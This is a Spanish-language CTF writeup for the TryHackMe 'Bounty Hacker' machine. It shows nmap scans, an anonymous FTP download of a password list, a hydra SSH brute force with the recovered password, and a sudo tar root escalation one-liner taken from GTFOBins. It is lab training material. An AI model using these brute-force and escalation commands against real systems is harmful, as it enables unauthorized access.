---
title: Bounty Hacker Writeup - TryHackMe
date: 2023-06-07
categories: [Writeups, THM]
tags: [Linux, THM, CTF, Easy, tar, SUDO]
img_path: /assets/img/commons/bounty_hacker/
image: bounty_hacker.png
---

¡Saludos!

En este writeup, nos adentraremos en la máquina [**Bounty Hacker**](https://tryhackme.com/room/cowboyhacker) de **TryHackMe**, categorizada con un nivel de dificultad fácil según la plataforma. Se trata de una máquina **Linux** en la que llevaremos a cabo una enumeración **web** y **FTP** para recopilar una lista de contraseñas que utilizaremos posteriormente en un ataque de fuerza bruta contra el servicio SSH, logrando así obtener acceso al servidor. Finalmente, escalaremos privilegios aprovechando el binario **tar** con permisos **SUDO**.

¡Vamos a empezar!

## Reconocimiento activo

---

Como primer paso, lanzamos el comando `ping` desde nuestro equipo atacante para verificar si la máquina objetivo está activa.

```bash
❯ ping -c 1 10.10.162.122
PING 10.10.162.122 (10.10.162.122) 56(84) bytes of data.
64 bytes from 10.10.162.122: icmp_seq=1 ttl=61 time=298 ms

--- 10.10.162.122 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 298.144/298.144/298.144/0.000 ms
```

Dado que el `TTL` es cercano a 64, podemos inferir que la máquina objetivo probablemente sea Linux.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -n -sS -Pn --min-rate 5000 10.10.162.122 -oG allPorts.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 23:28 -05
Nmap scan report for 10.10.162.122
Host is up (0.61s latency).
Not shown: 62987 filtered tcp ports (no-response), 2545 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 27.35 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, activamos los scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p 21,22,80 -sV -sC -Pn --min-rate 5000 10.10.162.122 -oN services.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-07 23:31 -05
Nmap scan report for 10.10.162.122
Host is up (0.27s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.2.11.100
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.71 seconds
```

El reporte nos revela que en la máquina víctima se están ejecutando los servicios **FTP** (`vsftpd 3.0.3`), **SSH** (`OpenSSH 7.2p2`) y **HTTP** (`Apache httpd 2.4.18`). Además, el servicio FTP permite el acceso anónimo.

### HTTP -80

Cuando ingresamos a la página web, vemos una imagen fija de la serie Cowboy Bebop.

![web](web.png)

Después de inspeccionar el código fuente y los directorios, no hallamos nada relevante. Por eso, el paso siguiente es enumerar el servicio FTP.

### FTP - 21

Sabemos que el servicio FTP admite el acceso anónimo, así que nos conectamos y listamis los archivos del servidor. Hay dos archivos de texto y los descargamos a la máquina atacante.

```bash
❯ ftp 10.10.162.122
Connected to 10.10.162.122.
220 (vsFTPd 3.0.3)
Name (10.10.162.122:juanr): Anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||5318|)
ftp: Can't connect to `10.10.162.122:5318': Expiró el tiempo de conexión
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> mget *
mget locks.txt [anpqy?]? y
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |*****************************************************************************************************************************************|   418        3.87 KiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (1.05 KiB/s)
mget task.txt [anpqy?]? y
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |*****************************************************************************************************************************************|    68      577.44 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.23 KiB/s)
```

El archivo `task.txt` contiene dos tareas y al final del archivo vemos que el remitente es `lin`, que podría ser un usuario potencial.

```bash
❯ cat task.txt
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

En cambio, el archivo `locks.txt` contiene lo que parece una lista de contraseñas.

```bash
❯ cat locks.txt
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7
```

## Explotación

---

Como sabemos un usuario potencial y una lista de contraseñas y además otro servicio que corre en la máquina es SSH, podemos probar un ataque de fuerza bruta con hydra.

```bash
❯ hydra -l lin -P locks.txt 10.10.162.122 -t 6 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-07 23:44:29
[DATA] max 6 tasks per 1 server, overall 6 tasks, 26 login tries (l:1/p:26), ~5 tries per task
[DATA] attacking ssh://10.10.162.122:22/
[22][ssh] host: 10.10.162.122   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-07 23:44:38
```

Después del ataque, conseguimos la contraseña del usuario `lin`, así que podemos entrar a la máquina por SSH.

```bash
❯ ssh lin@10.10.162.122
The authenticity of host '10.10.162.122 (10.10.162.122)' can't be established.
ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.162.122' (ED25519) to the list of known hosts.
lin@10.10.162.122's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ whoami 
lin
```

En el directorio `~/Desktop` podemos encontrar la flag de usuario.

```bash
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt 
THM{****************}
```

## Escalación de privilegios

---

### Abuso de b**inario tar con permisos SUDO**

El siguiente paso es encontrar un vector de ataque que nos ayude a escalar privilegios de root, así que empezamos por mostrar los comandos que el usuario `lin` puede correr con privilegios de superusuario o root.

```bash
lin@bountyhacker:~/Desktop$ sudo -l
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

Vemos que el usuario `lin` puede ejecutar el comando `/bin/tar` como `root`.

Al consultar en [GTFOBins](https://gtfobins.github.io/), podemos ver que es posible explotar este binario para escalar privilegios con el comando que se muestra en la figura.

![gtfobins](gtfobins.png)

Ejecutamos el comando especificado y verificamos que hemos escalado privilegios `root` con el comando `whoami`.

```bash
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
```

Por último, accedemos al directorio `/root` y leemos la última flag.

```bash
# cd /root
# ls
root.txt
# cat root.txt
THM{*************}
```

!Happy Hacking¡
